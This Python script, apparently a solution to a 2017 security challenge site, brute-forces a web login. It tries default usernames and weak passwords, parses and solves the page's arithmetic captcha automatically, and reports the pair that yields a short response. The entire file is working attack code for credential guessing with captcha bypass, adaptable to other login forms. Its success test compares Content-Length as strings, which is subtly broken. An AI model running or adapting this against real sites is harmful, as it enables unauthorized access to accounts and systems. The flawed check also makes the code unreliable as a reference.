#Baráth Dávid
#Login_mechnaize.py
import mechanize
from bs4 import BeautifulSoup
import operator


usernames=["root","john","admin","printer"]
passwords=["password","1234","qwerty","admin"]
All=[]
Pass=[]
User=[]
print("Starting the login session ...")

#Loop throught usernames and password options
for u_element in usernames:
    for p_element in passwords:

    #setBrowser: Combinate Mechanize with BeautifulSoup,this way i can acess elements without page refresh(url reopen)
        br = mechanize.Browser()
        a=br.open("https://afeladat2017.whiteshield.net/login")
        br.select_form(nr=0)
        res = br.submit()
        html = res.read()
        soup = BeautifulSoup(html,"lxml")

    #Find elements:
        form = soup.find("form", action="/login")
        captcha= form.find("span", id="math").text # captcha example( 4 * 9 = )
        math=captcha.replace('=', '') #math example(4 * 9 )

    #Get Captcha tags: Using operator Module to calculate the validation
        ops = {
            "+": operator.add,
            "-": operator.sub,
            "*": operator.mul,
            "/": operator.truediv
              }
        if(math[1] not in ["+","-","/","*"]): #example( 10*9 )
            web_operators = math[2]  #example( * )
            first_math = math[0:2]  #example( 10 )
            second_math = math[3:]  #example( 9 )
        else: #example( 4*9 )
            web_operators=math[1]    #example( * )
            first_math = math[0]    #example( 4 )
            second_math = math[2:]  #example( 9 )

    #Calculate the actual calculation
        operators = ops[web_operators](int(first_math),int(second_math))
        str_operator = str(operators)
        
    #Login:
        br.select_form(action='/login') #select form, i could use here nr=0 too
        User.append(u_element)  #save the current username
        Pass.append(p_element)  #save the current password

    #Fill the form
        br.form['username'] = u_element 
        br.form['password'] =  p_element
        br.form['captcha_1'] = str_operator
        All.append([u_element,p_element,first_math,web_operators,second_math,operators]) #Save filled the datas
        
    #Submit the form, Give a response to the user
        print("\n")
        print(f"Username: {All[-1][0]}")
        print(f"Password: {All[-1][1]}")
        print(f"Captcha: {All[-1][2]} {All[-1][3]} {All[-1][4]} = {All[-1][5]} ")
        response=br.submit()

    #I used here ._headers["Content-Length"] because there was a difference between correct and uncorect login
        if(response._headers["Content-Length"] < "2000"):
            print("")
            print("Sucess!")
            print(f"The correct username was: {User[-1]}")
            print(f"The correct password was: {Pass[-1]}")
            print("")
            print("Response: \n",response.read())
            exit()
        else: 
            print("Fail! Please try again.")
